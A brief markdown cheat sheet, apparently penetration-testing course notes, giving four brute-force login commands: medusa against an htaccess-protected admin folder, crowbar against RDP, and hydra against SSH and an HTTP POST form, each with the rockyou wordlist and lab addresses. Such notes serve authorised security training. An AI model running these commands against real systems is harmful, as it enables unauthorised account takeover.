# Bruteforce


1. For htaccess-protected folder like admin, we can bruteforce the login page using medusa.
```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin

```
2. Remote Desktop Protocol Attack with Crowbar
```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```
3. SSH Attack with THC-Hydra
```
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
```
4. HTTP POST Attack with THC-Hydra
```
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```